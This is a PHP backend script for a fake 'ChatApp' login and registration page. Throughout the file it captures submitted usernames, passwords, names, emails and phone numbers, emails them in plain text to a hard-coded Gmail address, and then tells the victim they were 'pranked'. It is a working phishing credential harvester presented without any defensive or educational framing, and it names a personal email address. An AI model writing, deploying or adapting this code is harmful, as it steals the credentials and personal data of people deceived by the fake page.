<?php
// Change this email to your Gmail address
$yourEmail = "amineadda86@gmail.com";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
  $subject = "";
  $message = "";

  // Detect form by fields available
  if (isset($_POST['userInput'])) {
    // Login form
    $subject = "ChatApp Login Attempt";
    $userInput = htmlspecialchars($_POST['userInput']);
    $passwordInput = htmlspecialchars($_POST['passwordInput']);
    $rememberMe = isset($_POST['rememberMe']) ? "Yes" : "No";

    $message = "User Input: $userInput\nPassword: $passwordInput\nRemember Me: $rememberMe\n";

  } else if (isset($_POST['fullName'])) {
    // Register form
    $subject = "ChatApp New Registration";
    $fullName = htmlspecialchars($_POST['fullName']);
    $email = htmlspecialchars($_POST['email']);
    $phone = htmlspecialchars($_POST['phone']);
    $regPassword = htmlspecialchars($_POST['regPassword']);
    $confirmPassword = htmlspecialchars($_POST['confirmPassword']);

    $message = "Full Name: $fullName\nEmail: $email\nPhone: $phone\nPassword: $regPassword\nConfirm Password: $confirmPassword\n";
  } else {
    $subject = "ChatApp Unknown Form Submission";
    $message = "Form data:\n" . print_r($_POST, true);
  }

  $headers = "From: noreply@chatapp.com\r\nReply-To: noreply@chatapp.com\r\n";

  if (mail($yourEmail, $subject, $message, $headers)) {
    echo "<!DOCTYPE html><html lang='en'><head><title>Pranked!</title><meta charset='UTF-8'>";
    echo "<meta name='viewport' content='width=device-width, initial-scale=1' />";
    echo '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />';
    echo "</head><body class='d-flex justify-content-center align-items-center vh-100 bg-light'>";
    echo "<div class='text-center p-5 border rounded shadow'>";
    echo "<h1 class='display-3 text-danger'>You get pranked!</h1>";
    echo "<p class='lead'>Thanks for submitting your info 😜</p>";
    echo '<a href="index.html" class="btn btn-primary mt-3">Back to Login</a>';
    echo "</div></body></html>";
  } else {
    echo "Failed to send email.";
  }
} else {
  header("Location: index.html");
  exit();
}
?>
